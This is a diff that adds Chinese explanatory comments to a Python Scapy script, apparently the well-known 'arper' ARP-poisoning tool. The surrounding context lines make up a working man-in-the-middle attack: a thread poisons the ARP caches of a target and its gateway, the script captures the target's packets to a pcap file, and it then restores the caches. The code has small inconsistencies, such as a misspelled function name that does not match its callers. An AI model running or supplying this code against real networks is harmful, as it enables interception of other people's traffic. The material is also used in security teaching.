@@ -11,12 +11,14 @@ def resotre_target(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
 		hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
 
+	# 发送退出信号到主线程
     os.kill(os.getpid(), signal.SIGINT)
 
 def get_mac(ip_address):
     responses,unanswered=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
 	    timeout=2, retry=10)
 
+	# 返回从捕获数据包中获取的MAC地址
     for s,r in responses:
 	return r[Ether].src
 
@@ -57,7 +59,9 @@ target_ip="192.168.213.100"
 gateway_ip="192.168.213.254"
 packet_count=1000
 
+# 设置嗅探的网卡
 conf.iface=interface
+# 关闭输出
 conf.verb=0
 
 print "[*] Setting up %s" % interface
@@ -78,6 +82,7 @@ if target_mac is None:
 else:
     print "[+] Gateway %s is at %s " % (target_ip,target_mac)
 
+# 启用ARP投毒线程
 poison_thread=threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
 poison_thread.start()
 
@@ -87,10 +92,13 @@ try:
     bpf_filter="ip host %s" % target_ip
     packets=sniff(count=packet_count, filter=bpf_filter, iface=interface)
 
+	# 将捕获的数据包输出到文件
     wrpcap("arper.pcap", packets)
 
+	# 还原网络配置
     restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
 except KeyboardInterrupt:
+	# 还原网络配置
     restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     sys.exit(0)
     
